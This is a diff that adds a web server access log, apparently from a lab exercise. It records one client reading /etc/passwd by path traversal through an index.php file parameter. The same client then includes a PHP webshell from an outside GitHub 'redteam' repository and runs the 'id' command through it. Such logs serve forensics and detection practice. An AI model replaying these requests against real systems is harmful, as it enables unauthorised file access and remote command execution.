@@ -1,0 +1,13 @@
+
+192.168.128.1 - - [25/Aug/2022:17:55:59 +0000] "GET /verysupersecret/ HTTP/1.1" 200 725 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
+192.168.128.1 - - [25/Aug/2022:17:56:22 +0000] "GET /verysupersecret/ HTTP/1.1" 200 725 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
+192.168.128.1 - - [25/Aug/2022:17:56:22 +0000] "GET /icons/blank.gif HTTP/1.1" 304 247 "http://172.17.0.1/verysupersecret/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
+192.168.128.1 - - [25/Aug/2022:17:56:22 +0000] "GET /icons/back.gif HTTP/1.1" 304 247 "http://172.17.0.1/verysupersecret/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
+192.168.128.1 - - [25/Aug/2022:17:56:22 +0000] "GET /icons/image2.gif HTTP/1.1" 304 248 "http://172.17.0.1/verysupersecret/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
+192.168.128.1 - - [25/Aug/2022:17:56:29 +0000] "GET /index.php?file=../../../../../../../etc/passwd HTTP/1.1" 200 647 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
+192.168.128.1 - - [25/Aug/2022:17:57:03 +0000] "GET /index.php?file=https://raw.githubusercontent.com/dxnboy/redteam/master/webshell/simple.php HTTP/1.1" 200 228 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
+192.168.128.1 - - [25/Aug/2022:17:57:26 +0000] "GET /index.php?file=https://raw.githubusercontent.com/dxnboy/redteam/master/webshell/simple.php&cmd=id HTTP/1.1" 200 228 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
+192.168.128.1 - - [25/Aug/2022:17:57:40 +0000] "GET /index.php?file=https://raw.githubusercontent.com/dxnboy/redteam/master/webshell/simple.php&cmd=id HTTP/1.1" 200 227 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
+192.168.128.1 - - [25/Aug/2022:17:57:53 +0000] "GET /index.php?file=https://raw.githubusercontent.com/dxnboy/redteam/master/webshell/simple.php&cmd=id HTTP/1.1" 200 282 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
+192.168.128.1 - - [25/Aug/2022:17:58:51 +0000] "GET /index.php?file=https://raw.githubusercontent.com/dxnboy/redteam/master/webshell/phpinfo.php HTTP/1.1" 200 22117 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
+192.168.128.1 - - [25/Aug/2022:18:04:09 +0000] "GET /index.php HTTP/1.1" 200 436 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
